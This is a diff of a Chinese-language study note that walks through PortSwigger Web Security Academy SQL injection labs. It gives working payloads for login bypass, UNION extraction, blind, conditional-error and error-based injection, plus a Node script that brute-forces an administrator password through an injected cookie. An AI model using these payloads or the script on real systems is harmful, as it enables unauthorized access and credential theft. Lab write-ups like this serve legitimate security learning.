@@ -1,11 +1,9 @@
 ---
-title: PortSwigger
-description: PortSwigger
+title: PortSwigger SQL Injection
+description: PortSwigger SQL Injection
 ---
 
-## SQL Injection
-
-### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
 Payload
 
@@ -19,7 +17,7 @@ SQL
 SELECT ... FROM products WHERE category = 'Accessories' OR 1=1--'
 ```
 
-### Lab: SQL injection vulnerability allowing login bypass
+## Lab: SQL injection vulnerability allowing login bypass
 
 Payload
 
@@ -27,7 +25,13 @@ Payload
 administrator' OR 1=1--
 ```
 
-### Lab: SQL injection with filter bypass via XML encoding
+SQL
+
+```sql
+SELECT ... FROM users WHERE username = 'administrator' OR 1=1--' AND password = '123'
+```
+
+## Lab: SQL injection with filter bypass via XML encoding
 
 先嘗試用 `UNION SELECT NULL--` 來判斷前面的 `SELECT` 選了幾個 columns
 
@@ -77,7 +81,7 @@ console 的結果
 
 接下來用 `administrator` + `020yk5zmzoy92jl364rg` 就可以成功登入～
 
-### Lab: SQL injection attack, querying the database type and version on Oracle
+## Lab: SQL injection attack, querying the database type and version on Oracle
 
 題目給的 Hint 很重要:
 
@@ -104,7 +108,7 @@ SQL
 SELECT ... FROM products WHERE category = 'Accessories' UNION SELECT banner,NULL FROM v$version--'
 ```
 
-### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
 
 這題稍微卡了一下，主要的卡點有兩個
 
@@ -151,7 +155,7 @@ SQL
 SELECT ... FROM products WHERE category = 'Lifestyle' UNION SELECT @@version,NULL#'
 ```
 
-### Lab: SQL injection attack, listing the database contents on non-Oracle databases
+## Lab: SQL injection attack, listing the database contents on non-Oracle databases
 
 根據 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet#comments)，最終得出需使用 `-- ` 的格式來當作註解，嘗試用 `UNION SELECT NULL` 慢慢猜出 `SELECT` 的 columns 數量
 
@@ -203,7 +207,7 @@ window.open(href, "_blank");
 
 這題我覺得可以延伸，因為我以前從來沒有研究過 `information_schema` 這個 Database 的內容，所以我是直接下載 [XAMPP](https://www.apachefriends.org/zh_tw/download.html)，使用 `phpmyadmin` 的 GUI 來觀察 `information_schema` 的內容，並且嘗試下 SQL 語法，一步一步拆解，過程真的非常有趣～
 
-### Lab: SQL injection attack, listing the database contents on Oracle
+## Lab: SQL injection attack, listing the database contents on Oracle
 
 跟上一題的概念一樣，只是改成 Oracle 的語法，先用 `UNION SELECT NULL` 來猜出 `SELECT` 的 columns 數量
 
@@ -253,7 +257,7 @@ const href = url.href;
 window.open(href, "_blank");
 ```
 
-### Lab: SQL injection UNION attack, determining the number of columns returned by the query
+## Lab: SQL injection UNION attack, determining the number of columns returned by the query
 
 這題意外的簡單，利用前面的技術 `UNION SELECT NULL` 來判斷 `SELECT` 多少 columns
 
@@ -264,7 +268,7 @@ const href = url.href;
 window.open(href, "_blank");
 ```
 
-### Lab: SQL injection UNION attack, finding a column containing text
+## Lab: SQL injection UNION attack, finding a column containing text
 
 承接上一題，就是把 `NULL` 換成題目指定的字串 `bpaLX3`，看哪個 index 換掉會成功
 
@@ -278,7 +282,7 @@ const href = url.href;
 window.open(href, "_blank");
 ```
 
-### Lab: SQL injection UNION attack, retrieving data from other tables
+## Lab: SQL injection UNION attack, retrieving data from other tables
 
 怎麼感覺跟前面的題目有點像@@
 
@@ -292,7 +296,7 @@ const href = url.href;
 window.open(href, "_blank");
 ```
 
-### Lab: SQL injection UNION attack, retrieving multiple values in a single column
+## Lab: SQL injection UNION attack, retrieving multiple values in a single column
 
 結合前面學到的，要猜出哪個 column 是 string
 
@@ -306,7 +310,7 @@ const href = url.href;
 window.open(href, "_blank");
 ```
 
-### Lab: Blind SQL injection with conditional responses
+## Lab: Blind SQL injection with conditional responses
 
 這題稍微麻煩，要一個一個字元去猜，先找出密碼的長度，結果是 20 碼
 
@@ -334,7 +338,7 @@ SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'HsacENgP06akYysN' AND (S
 
 這題要手動爆破會累死，基本上是要工具，本來沒有下載 Burp Suite，但我看 PortSwigger 的課程一直推薦自家產品，所以還是學一下好了XD
 
-### Lab: Blind SQL injection with conditional errors
+## Lab: Blind SQL injection with conditional errors
 
 主要的卡點
 
@@ -381,7 +385,7 @@ jP7Ryk30JRp4JvwD' AND (
 jP7Ryk30JRp4JvwD' AND (SELECT CASE WHEN (LENGTH(password) = 20) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a
 ```
 
-再用以下 SQL 語法爆破 password 的每個字元
+再用以下 SQL 語法爆破 password 的每個字元，可以使用二分法快速鎖定目標字元
 
 - 如果 password 第一個字元 `> 'm'`，就爆炸
 - 如果 password 第一個字元 `<= 'm'`，就正常
@@ -399,6 +403,104 @@ jP7Ryk30JRp4JvwD' AND (
   FROM users
   WHERE username = 'administrator'
 ) = 'a
+```
+
+但由於 20 碼實在太長，加上這是 httpOnly 的 cookie，沒辦法透過瀏覽器的 js 寫腳本爆破，所以我寫了一個陽春的 NodeJS 腳本來爆破
+
+```ts
+async function Blind_SQL_injection_with_conditional_errors() {
+  const trackingId = "YUw5DjjA1NCBljlO";
+  const session = "V6YewNgxfiwzhe7iiBEvX9APoGifBlir";
+  const url =
+    "https://0ad700fd041d3040808f0d46009c0089.web-security-academy.net/";
+  const passwordLength = 20;
+  const letters = Array(26)
+    .fill(0)
+    .map((_, i) => String.fromCharCode(97 + i));
+  const numbers = Array(10)
+    .fill(0)
+    .map((_, i) => `${i}`);
+  const passwordChars = letters.concat(numbers);
+  const password: string[] = [];
+  for (let i = 0; i < passwordLength; i++) {
+    for (const passwordChar of passwordChars) {
+      console.log({ i, passwordChar });
+      const response = await fetch(url, {
+        headers: {
+          cookie: `session=${session}; TrackingId=${trackingId}' AND (SELECT CASE WHEN (SUBSTR(password, ${i + 1}, 1) = '${passwordChar}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a`,
+        },
+      });
+      if (response.status === 500) {
+        password[i] = passwordChar;
+        break;
+      }
+    }
+  }
+  console.log("result");
+  console.log(password.join(""));
+}
+
+Blind_SQL_injection_with_conditional_errors();
+```
+
+### Lab: Visible error-based SQL injection
+
+對應文章：https://portswigger.net/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages
+
+先嘗試在 cookies.TrackingId 注入 `'`
+
+```
+TrackingId=8F6rc8mGRxhQxZx9'
+```
+
+根據錯誤訊息，可以看到以下 SQL
+
+```sql
+SELECT * FROM tracking WHERE id = '8F6rc8mGRxhQxZx9''
+```
+
+嘗試正確的語法
+
+```sql
+SELECT * FROM tracking WHERE id = '8F6rc8mGRxhQxZx9'--'
+```
+
+再度嘗試一個正確的語法
+
+```sql
+SELECT * FROM tracking WHERE id = '8F6rc8mGRxhQxZx9' UNION SELECT password FROM users--'
+```
+
+思考了一下，這題不太可能繼續用爆破的方式，文章內有提供解題思路
+
+You can use the `CAST()` function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:
+
+```sql
+CAST((SELECT example_column FROM example_table) AS int)
+```
+
+Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an int, may cause an error similar to the following:
+
+```
+ERROR: invalid input syntax for type integer: "Example data"
+```
+
+嘗試了很多組合，最終發現這樣可以印出 `ERROR: invalid input syntax for type boolean: "administrator"`
+
+```sql
+SELECT * FROM tracking WHERE id = '' OR CAST((SELECT username FROM users LIMIT 1) AS boolean)--'
+```
+
+我猜測是 trackingId 有限制長度？因為太長的 SQL 語法會被截斷，還好第一筆就是 `administrator`，這樣就可以成功拿到密碼了
+
+```sql
+SELECT * FROM tracking WHERE id = '' OR CAST((SELECT password FROM users LIMIT 1) AS boolean)--'
+```
+
+P.S. 解完這題之後，回頭看 Solution，發現真的有限制 trackingId 的長度，而且 Solution 提供的答案跟我一樣，都是用 `LIMIT 1` 賽到的
+
+```
+Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.
 ```
 
 ## 參考資料
